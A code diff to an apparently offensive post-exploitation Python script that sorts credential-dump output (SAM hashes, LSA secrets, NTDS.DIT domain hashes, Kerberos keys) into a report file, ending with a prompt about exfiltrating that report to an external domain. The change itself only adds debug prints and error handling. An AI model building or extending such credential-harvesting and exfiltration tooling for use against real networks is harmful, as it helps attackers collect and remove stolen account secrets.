@@ -59,7 +59,7 @@ def process_secrets_dump(filepath):
     end_sam = "[*] Dumping cached domain logon information (domain/username:hash)"
 
     start_lsa = "[*] Dumping LSA Secrets"
-    end_lsa = "[*] DefaultPassword"
+    end_lsa = "[*] NL$KM"
 
     start_domain = "[*] Using the DRSUAPI method to get NTDS.DIT secrets"
     end_domain = "[*] Kerberos keys grabbed"
@@ -108,26 +108,37 @@ def process_secrets_dump(filepath):
 
             if sam_flag:
                 sam_hashes.append(line.strip())
+                print("appended SAM")
             elif lsa_flag:
                 lsa_hashes.append(line.strip())
+                print("appended LSA")
             elif domain_flag:
                 domain_hashes.append(line.strip())
+                print("appended DOMAIN")
             elif kerberos_flag:
                 kerberos_info.append(line.strip())
+                print("appended KERBEROS")
+    try:
+        with open('./output.txt', 'a') as of:
+            of.write("Local SAM Hashes:\n")
+            for hash in sam_hashes:
+                of.write(f"{hash}\n")
+                #print(f"Written {hash}")
+            of.write("\nLSA Secrets:\n")
+            for lsahash in lsa_hashes:
+                of.write(f"{lsahash}\n")
+                #print(f"Written {lsahash}")
+            of.write("\nDomains:\n")
+            for domainhash in domain_hashes:
+                of.write(f"{domainhash}\n")
+                #print(f"Written {domainhash}")
+            of.write("\nKerberos keys:\n")
+            for key in kerberos_info:
+                of.write(f"{key}\n")
+                #print(f"Written {key}")
 
-    with open('./output.txt', 'a') as of:
-        of.write("Local SAM Hashes:\n")
-        for hash in sam_hashes:
-            of.write(f"{hash}\n")
-        of.write("\nLSA Secrets:\n")
-        for lsahash in lsa_hashes:
-            of.write(f"{lsahash}\n")
-        of.write("\nDomains:\n")
-        for domainhash in domain_hashes:
-            of.write(f"{domainhash}\n")
-        of.write("\nKerberos keys:\n")
-        for key in kerberos_info:
-            of.write(f"{key}\n")
+    except Exception as e:
+        print(f"Error: {e}")
 
 # Find out if the report should be exfiltrated
 exfilBool = input("Would you like the generated report to be exfiltrated to an external domain? (y/n)\n")
